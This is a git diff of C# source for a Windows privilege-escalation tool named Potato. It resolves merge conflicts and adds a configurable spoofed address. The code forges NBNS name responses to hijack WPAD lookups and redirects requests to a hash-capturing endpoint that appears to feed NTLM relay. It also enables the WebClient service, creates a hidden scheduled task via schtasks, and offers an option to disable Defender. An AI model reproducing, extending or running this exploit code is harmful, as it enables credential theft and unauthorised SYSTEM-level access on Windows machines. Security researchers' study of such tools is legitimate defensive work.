@@ -21,10 +21,7 @@ namespace Potato
         public AutoResetEvent finished = new AutoResetEvent(false);
         private int state = 0;
         private String cmd;
-<<<<<<< HEAD
         private int srvPort;
-=======
->>>>>>> a80fdfbf7cbef7ae601d584bf185afc7c211099c
         private String[] wpad_exclude;
         private Queue<byte[]> ntlmQueue = new Queue<byte[]>();
         Thread smbRelayThread;
@@ -152,11 +149,8 @@ namespace Potato
                     {
                         Random rnd = new Random();
                         int sess = rnd.Next(1, 1000000);
-<<<<<<< HEAD
                         response.Headers.Add("Location", "http://localhost:"+srvPort+"/GETHASHES"+sess);
-=======
-                        response.Headers.Add("Location", "http://localhost/GETHASHES"+sess);
->>>>>>> a80fdfbf7cbef7ae601d584bf185afc7c211099c
+
                         Console.WriteLine("Redirecting to target.."+response.Headers["Location"]);
                         response.StatusCode = 302;
                         writer.Close();
@@ -197,10 +191,7 @@ namespace Potato
             NHttp.HttpServer server = new NHttp.HttpServer();
             this.cmd = cmd;
             this.wpad_exclude = wpad_exclude;
-<<<<<<< HEAD
             this.srvPort = port;
-=======
->>>>>>> a80fdfbf7cbef7ae601d584bf185afc7c211099c
             server.EndPoint = new IPEndPoint(IPAddress.Loopback, port);
             server.RequestReceived += recvRequest;
             server.Start();
@@ -304,8 +295,8 @@ namespace Potato
                              .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                              .ToArray();
         }
-        public abstract void startSpoofing(String localIp, String spoof_host, bool disableExhaust);
-        public abstract void checkSpoof(String host);
+        public abstract void startSpoofing(String localIp, String spoof_host,String spoof_address, bool disableExhaust);
+        public abstract void checkSpoof(String host,String address);
     }
 
     class NBNSSpoofer : Spoofer
@@ -322,9 +313,17 @@ namespace Potato
             return hex.Replace("-", ",");
         }
 
-        private byte[] createNbnsResponse(String host)
+        private byte[] createNbnsResponse(String host,String ip)
         {
-            byte[] packet = new byte[62] {0xdb,0xa0,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0x00,0x00,0x20,0x00,0x01,0x00,0x04,0x93,0xe0,0x00,0x06,0x00,0x00,0x7f,0x00,0x00,0x01};
+            String[] segments = ip.Split('.');
+            byte[] ipFields = new byte[4];
+            ipFields[0] = Byte.Parse(segments[0]);
+            ipFields[1] = Byte.Parse(segments[1]);
+            ipFields[2] = Byte.Parse(segments[2]);
+            ipFields[3] = Byte.Parse(segments[3]);
+
+
+            byte[] packet = new byte[62] {0xdb,0xa0,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0x00,0x00,0x20,0x00,0x01,0x00,0x04,0x93,0xe0,0x00,0x06,0x00,0x00,ipFields[0],ipFields[1],ipFields[2],ipFields[3]};
 	        
             host = host.ToUpper();
             packet[12] = 0x20;
@@ -344,9 +343,9 @@ namespace Potato
            return packet;
         }
 
-        public override void startSpoofing(String localIp,String spoof_host, bool disableExhaust)
+        public override void startSpoofing(String target_ip,String spoof_host,String spoof_address, bool disableExhaust)
         {
-            Console.WriteLine("Starting NBNS spoofer...");
+            Console.WriteLine("Starting NBNS spoofer..."+spoof_host+" = "+spoof_address);
             Thread spoofThread = new Thread(() => this.exhaustUdpPorts(137));
             if (!disableExhaust)
             {
@@ -358,10 +357,10 @@ namespace Potato
             }
             UInt32 result = DnsFlushResolverCache();
             UdpClient udpc = new UdpClient(137);
-            IPAddress serverAddr = IPAddress.Parse(localIp);
+            IPAddress serverAddr = IPAddress.Parse(target_ip);
             IPEndPoint endPoint = new IPEndPoint(serverAddr, 137);
             udpc.Connect(endPoint);
-            byte[] packet = createNbnsResponse(spoof_host);
+            byte[] packet = createNbnsResponse(spoof_host,spoof_address);
 
             while (true)
             {
@@ -378,11 +377,11 @@ namespace Potato
             }
         }
 
-        public override void checkSpoof(String host)
+        public override void checkSpoof(String host,String address)
         {
             IPAddress[] hostIp = null;
             int count =501;
-            while (hostIp == null || hostIp.Length == 0 || !hostIp[0].ToString().Equals("127.0.0.1"))
+            while (hostIp == null || hostIp.Length == 0 || !hostIp[0].ToString().Equals(address))
             {
                 count = count + 1;
                 if (count > 500)
@@ -495,11 +494,8 @@ namespace Potato
     }
     class ScheduleTask
     {
-<<<<<<< HEAD
+
         public void schtask(int port)
-=======
-        public void schtask()
->>>>>>> a80fdfbf7cbef7ae601d584bf185afc7c211099c
         {
             Console.WriteLine("Enabling WebClient service...");
             System.Diagnostics.Process process4 = new System.Diagnostics.Process();
@@ -517,11 +513,8 @@ namespace Potato
             System.Diagnostics.ProcessStartInfo startInfo3 = new System.Diagnostics.ProcessStartInfo();
             startInfo3.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
             startInfo3.FileName = "cmd.exe";
-<<<<<<< HEAD
             startInfo3.Arguments = "/C schtasks.exe /Create /TN omg /TR  \\\\127.0.0.1@"+port+"\\test /SC ONCE /ST "+now+" /F";
-=======
-            startInfo3.Arguments = "/C schtasks.exe /Create /TN omg /TR  \\\\127.0.0.1\\test /SC ONCE /ST "+now+" /F";
->>>>>>> a80fdfbf7cbef7ae601d584bf185afc7c211099c
+
             Console.WriteLine(startInfo3.Arguments);
             process3.StartInfo = startInfo3;
             process3.Start();
@@ -547,7 +540,8 @@ namespace Potato
         {
             Dictionary<string, string> argDict = parseArgs(args);
             String cmd = "\"C:\\Windows\\System32\\cmd.exe\" /K start";
-            String ip = null, disable_exhaust = null, disable_spoof = null, disable_defender = null,schedule_task = null,spoof_host = "WPAD";
+            String ip = null,spoof_address = null,disable_exhaust = null, disable_spoof = null, disable_defender = null,schedule_task = null,spoof_host = "WPAD";
+         
             String wpad_exclude_str="live.sysinternals.com";
             int srvPort = 80;
    
@@ -560,10 +554,12 @@ namespace Potato
             if (argDict.ContainsKey("wpad_exclude")) wpad_exclude_str = argDict["wpad_exclude"];
             if (argDict.ContainsKey("schedule_task")) schedule_task = argDict["schedule_task"];
             if (argDict.ContainsKey("srv_port")) srvPort = Int32.Parse(argDict["srv_port"]);
+            if (argDict.ContainsKey("spoof_address")) spoof_address = argDict["spoof_address"];
+            else spoof_address = "127.0.0.1";
 
             if (ip == null)
             {
-                Console.WriteLine("Usage: potato.exe -ip <ip address, required> -cmd <command, optional> -disable_exhaust <true/false, optional> -disable_defender <true/false, optional> -disable_spoof <true/false, optional> -spoof_host <default wpad, optional> -wpad_exclude <comma separated host to exclude, optional> -schedule_task <true/false, Win10 only, optional> -srv_port <port for webserver to listen, default 80>");
+                Console.WriteLine("Usage: potato.exe -ip <ip address, required> -cmd <command, optional> -disable_exhaust <true/false, optional> -disable_defender <true/false, optional> -disable_spoof <true/false, optional> -spoof_host <default wpad, optional> -spoof_address <default, localip> -wpad_exclude <comma separated host to exclude, optional> -schedule_task <true/false, Win10 only, optional> -srv_port <port for webserver to listen, default 80>");
                 return 0;
             }
             bool disableExhaust = false;
@@ -580,7 +576,7 @@ namespace Potato
             Thread httpServerThread = new Thread(() => httpServer.startListening(cmd,wpad_exclude,srvPort));
             httpServerThread.Start();
             
-            Thread spoofThread = new Thread(() => spoof.startSpoofing(ip, spoof_host, disableExhaust));
+            Thread spoofThread = new Thread(() => spoof.startSpoofing(ip,spoof_host,spoof_address, disableExhaust));
 
             if (disable_spoof == null || disable_spoof.Equals("false"))
             {
@@ -592,7 +588,7 @@ namespace Potato
                         Thread.Sleep(2000);
                     }
                 }
-                spoof.checkSpoof(spoof_host);
+                spoof.checkSpoof(spoof_host,spoof_address);
                 Console.WriteLine("Spoofed target " + spoof_host + " succesfully...");
             }
 
@@ -604,17 +600,11 @@ namespace Potato
             }
 
             ScheduleTask sc = new ScheduleTask();
-<<<<<<< HEAD
+
             Thread schTask = new Thread(() => sc.schtask(srvPort));
             if (schedule_task != null && schedule_task.Equals("true"))
             {
                 schTask.Start(srvPort);
-=======
-            Thread schTask = new Thread(() => sc.schtask());
-            if (schedule_task != null && schedule_task.Equals("true"))
-            {
-                schTask.Start();
->>>>>>> a80fdfbf7cbef7ae601d584bf185afc7c211099c
             }
 
             httpServer.finished.WaitOne();
